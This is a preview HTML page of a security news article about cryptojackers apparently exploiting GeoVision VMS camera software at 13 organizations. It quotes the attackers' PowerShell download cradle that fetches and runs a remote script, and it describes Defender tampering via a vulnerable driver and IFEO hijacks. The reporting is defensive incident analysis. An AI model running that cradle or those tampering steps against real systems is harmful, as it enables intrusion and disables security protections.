@@ -1,0 +1,67 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Which GeoVision camera flaw let cryptojackers into 13 organizations? · Riftweld preview</title><link rel="stylesheet" href="../assets/style.css"></head>
+<body><div class="wrap">
+<p class="eyebrow">Riftweld · headless writer test</p>
+<h1>Which GeoVision camera flaw let cryptojackers into 13 organizations?</h1>
+<p class="standfirst">Huntress watched a GeoVision service spawn PowerShell with SYSTEM rights at 13 organizations, then plant a loader built to outlive its own servers. Neither the researchers nor the vendor will say which of the three suspect flaws let them in.</p>
+<div class="meta"><span>Style: Brian Krebs</span><span>Status: review</span><span>Report 466</span></div>
+<h2>The incident</h2>
+<p>On many endpoints <code>GeoStartupAgentService.exe</code> was running as <code>NT AUTHORITY\SYSTEM</code>, the highest local privilege level on a Windows host, so whatever it launched inherited those rights. Camera software has little legitimate reason to start a command shell, which is how the SOC noticed.</p>
+<p>The first command Huntress recorded was a download cradle:</p>
+<pre><code>cmd.exe /c powershell -c iex (new-object net.webclient).downloadstring('hxxp://45[.]32[.]117[.]34/a')
+</code></pre>
+<p>That pulled three PowerShell scripts labeled <code>a</code>, <code>b</code>, and <code>c</code> from the staging address <code>45.32.117.34</code>.</p>
+<h3>WHY DOES A CAMERA SERVICE TOUCH DEFENDER?</h3>
+<p>Script <code>a</code> ran in memory, hunted for writable directories, and checked whether Microsoft Defender was active. Script <code>b</code> was written to disk, launched through WMI, repeated the writable-directory probe, and downloaded <code>kvckiller.sys</code>, a kernel driver that VirusTotal identifies as <code>wsftprm.sys</code>, previously abused in bring-your-own-vulnerable-driver (BYOVD) attacks to tamper with antivirus protections.</p>
+<p>Then came the registry work. Huntress observed three Image File Execution Options (IFEO) Debugger values written under the keys for <code>MsMpEng.exe</code>, <code>SecurityHealthService.exe</code>, and <code>SecurityHealthSystray.exe</code>, each pointing at <code>systray.exe</code>. IFEO is a Windows troubleshooting feature that lets an administrator name a debugger to start with a given executable; pointed at the wrong binary, it stops the real one from running. According to Help Net Security, the hijacks were most likely meant to stop those components from starting.</p>
+<h3>WHY BUILD A LOADER THAT CANNOT BE SHUT DOWN?</h3>
+<p>Script <code>c</code> ran in memory and fetched <code>update.exe</code>, a custom Golang loader, from <code>156.246.94.183</code>. That address resolved to <code>cctv-update.top</code>, a domain registered on November 7, 2026 at 02:40 UTC, one day before the main intrusion wave.</p>
+<p>The loader is the part worth keeping. It embeds a BitTorrent Mainline DHT client and a PKARR resolver, public-key addressable resource records, which let an operator publish current server addresses under a public key. In practice the operator can rotate infrastructure without registering new domains and without losing the infected hosts. Anthony Gibbs, a security operations analyst at Huntress, described the loader to Help Net Security as "botnet-like."</p>
+<p>Persistence came in two scheduled tasks: <code>PackageUpdater</code>, running <code>C:\WINDOWS\system32\config\systemprofile\update.exe</code> every 15 minutes, and <code>PackageUpdater_Startup</code>, running at boot with SYSTEM privileges. The loader then pulled XMRig, the open-source miner, and saved it as <code>ApplyUpdate.exe</code>.</p>
+<h2>The trail</h2>
+<p>The records put the preparation before the crime. The domain was registered at 02:40 UTC on November 7. The wave began the next day and ran through November 10. GeoVision released its XMRig advisory, GV-SFW-2026-11-01, on November 11; its customer response, article GV0-26-11-12, followed on November 12. Huntress published on November 13, and Help Net Security's account, which added the version detail, ran on November 16.</p>
+<p>The version detail is the link back to the patch. A sample of affected hosts was running GV-VMS 17.4.8.0, a build compiled April 24, 2024, Gibbs told Help Net Security. GeoVision's April 27, 2026 advisory, GV-VMS-2026-04-01, had already disclosed three stack-overflow vulnerabilities in the WebCam Server component of GV-VMS V20.0.2 and earlier, V17.4.8 and earlier, and V18.3.5 and earlier, all reachable through an unauthenticated HTTP request.</p>
+<p>The three, as NVD records them:</p>
+<ul>
+<li><strong>CVE-2026-42369</strong>, an unbounded copy of a base64-decoded string into a 256-byte stack buffer through the <code>gvapi</code> endpoint, in a binary compiled without ASLR. GeoVision scored it 10.0; NVD has not issued its own base score.</li>
+<li><strong>CVE-2026-42370</strong>, a stack overflow in the WebCam Server login path. Cisco Talos analyzed the <code>log_login</code> function for TALOS-2026-2369 (researcher Philippe Laulheret) and found an unsafe <code>strcpy</code> of an unchecked-length username onto a stack buffer, with ASLR disabled on <code>WebcamServer.exe</code> and its DLLs. NVD scored it 9.8.</li>
+<li><strong>CVE-2026-7372</strong>, an unconstrained <code>sscanf</code> splitting the authorization buffer into <code>username</code> and <code>password</code> stack variables of 40 characters each. Values longer than 40 overflow the stack. Scored 9.0.</li>
+</ul>
+<p>GeoVision fixed them in V20.0.2.10, V17.4.8.58, and V18.3.5.22. NVD published its records on May 3, 2026; Talos went public with TALOS-2026-2369 on June 15.</p>
+<p>The money trail, such as it is, stops at the miner. XMRig mines to somebody's account, and no wallet address, mining pool, or configuration has been published by Huntress or GeoVision. No threat actor has been named. The trail that usually answers the question, who gets paid, is not in the record.</p>
+<h2>What the record shows</h2>
+<p>What is confirmed: the campaign, the exposure condition, the SYSTEM-level execution, the kernel driver, the IFEO hijacks, the DHT/PKARR loader, the scheduled tasks, and the XMRig payload. What is assessed, but not confirmed, is how the attackers got in.</p>
+<p>Huntress never named a CVE or a product version. "GeoVision's April 2026 advisory identifies three unauthenticated remote-code-execution vulnerabilities in the WebCam Server functionality affecting this version (GV-VMS 17.4.8.0), making exploitation of a known flaw the most likely explanation," Austin Worline, a senior security operations analyst at Huntress, told Help Net Security. "We haven't determined at this time, which of the three CVEs was used or confirmed whether GeoVision considered these installations supported."</p>
+<p>GeoVision's own November advisory is more definite, describing unauthenticated WebCam Server remote code execution that leads to PowerShell running as SYSTEM and XMRig deployment, and pointing customers at the same three CVEs. But neither the vendor nor the researchers has published exploit traffic, exploit code, or a CVE attribution for what was actually sent at the cameras.</p>
+<p>The discrepancies around that gap are worth stating plainly:</p>
+<ul>
+<li>Huntress's advisory body says "ten accounts and 13 organizations"; the MITRE ATT&amp;CK table in the same advisory says "nine accounts and 13 organizations."</li>
+<li>NVD's affected-product tables for all three CVEs list only GV-VMS V20.0.2, omitting V17.4.8 and V18.3.5 even though GeoVision's advisory includes both branches.</li>
+<li>The April fix for V17 was V17.4.8.58; the November 12 response directs V17 customers to V17.4.8.65, a cumulative patch that supersedes it. Either way, 17.4.8.0 was unpatched.</li>
+<li>HashLytics described CVE-2024-6047 and CVE-2024-11120 as Huntress's "candidates" for this intrusion. That misstates the position: those 2024 flaws are OS command injection in end-of-life GeoVision devices, added to CISA's Known Exploited Vulnerabilities catalog on May 7, 2025 with a May 28, 2025 deadline, and cited by Help Net Security only as historical context. None of the three WebCam Server CVEs is KEV-listed as of this writing.</li>
+<li>Huntress saw <code>WebCamServer.exe</code> reach out to <code>2.59.133.151</code> and called it the "likely source of exploitation," without explaining the direction or purpose of that connection.</li>
+</ul>
+<p>The harm is concrete and larger than a slowed-down PC. Attackers held SYSTEM, loaded a vulnerable kernel driver, blinded Defender, and installed a loader designed to fetch whatever comes next. Huntress said it found no evidence that access was sold or used for anything other than mining in these incidents. The capability was there regardless, which is why Huntress's guidance is to consider rebuilding affected hosts from known-good media rather than deleting a few files and calling it cleaned.</p>
+<p>For defenders, the record suggests four checks: patch GV-VMS to V20.1.3, V18.3.5.25, or V17.4.8.65; pull WebCam Server off the public internet or restrict it to trusted addresses; look for command shells or PowerShell sessions parented by <code>GeoStartupAgentService.exe</code> in Event ID 4688 and script-block logs (4104); and inspect the IFEO keys for <code>MsMpEng.exe</code>, <code>SecurityHealthService.exe</code>, and <code>SecurityHealthSystray.exe</code>. GeoVision's advisory lists the ports to restrict, among them 80, 554, 4550, 5550, 5552, 15552, 3388, 5611, 6550, 6200, and 48000.</p>
+<p>"Personally, I have not seen this technique seen used in other cryptomining campaigns, but that doesn't mean it isn't," Gibbs told Help Net Security, referring to the DHT and PKARR loader.</p>
+<p>What remains unknown is the thing the headline asks: which flaw, exactly, opened the door. A patch exists, a build date exists, and a plausible set of three CVEs exists. The exploit that connects them to these 13 organizations does not, at least not in public.</p>
+<p>Thirteen organizations, one build from April 2024, and a miner that pays someone else's electricity bill.</p>
+<p><em>Update, Nov. 17, 2026: GeoVision's advisory remains marked "Continuously Updated." No CVE has been tied to the observed exploitation, and CVE-2026-42369, CVE-2026-42370, and CVE-2026-7372 are not in CISA's KEV catalog.</em></p>
+
+<div class="src"><strong>Sources</strong>
+<ol>
+<li><a href="https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer">Huntress, GeoVision Camera Software Abused to Deploy XMRig Cryptominer</a> (Nov. 13, 2026), SOC observations and IOCs.</li>
+<li><a href="https://www.helpnetsecurity.com/2026/11/16/geovision-camera-software-vulnerabilities/">Help Net Security</a> (Nov. 16, 2026), Huntress interviews and version detail.</li>
+<li><a href="https://dlcdn.geovision.com.tw/TechNotice/CyberSecurity/2026/XMRig_Response.pdf">GeoVision, GV-SFW-2026-11-01 / GV0-26-11-12</a> (Nov. 12, 2026), patch builds and exposure condition.</li>
+<li><a href="https://dlcdn.geovision.com.tw/TechNotice/CyberSecurity/2026/Security_Advisory_GV-VMSV20-2026-04-01.pdf">GeoVision, GV-VMS-2026-04-01</a> (Apr. 27, 2026), the three WebCam Server CVEs.</li>
+<li><a href="https://dlcdn.geovision.com.tw/TechNotice/CyberSecurity/2026/Security_Advisory_XMRigAttackAdvisory-2026-11-01.pdf">GeoVision, XMRig attack advisory</a> (Nov. 11, 2026), artifacts, ports, removal steps.</li>
+<li>NVD: <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42369">CVE-2026-42369</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42370">CVE-2026-42370</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7372">CVE-2026-7372</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6047">CVE-2024-6047</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-11120">CVE-2024-11120</a>.</li>
+<li><a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2026-2369">Cisco Talos, TALOS-2026-2369</a>, CVE-2026-42370 analysis.</li>
+<li><a href="https://github.com/advisories/GHSA-hr8m-7mwf-v24x">GitHub Advisory Database, GHSA-hr8m-7mwf-v24x</a>.</li>
+<li><a href="https://zerodaywire.com/article/geovision-gv-vms-xmrig-webcam-server-patch">Zero Day Wire</a> and <a href="https://zerodayfeed.com/article/geovision-gv-vms-xmrig-cryptominer-huntress-november-2026">Zero Day Feed</a> (Nov. 16, 2026), patch targets, artifact list, NVD scope caveat.</li>
+<li><a href="https://intel.threadlinqs.com/threat/TL-2026-6129">ThreadLinqs, TL-2026-6129</a>, detection rules; accounts discrepancy.</li>
+<li><a href="https://hashlytics.io/geovision-flaw-allowed-cryptojackers-to-hit-13-orgs/">HashLytics</a>, the framing flagged above as an error.</li>
+</ol></div>
+<footer>Preview build from the headless writer session. Not the Riftweld production site.</footer>
+</div></body></html>
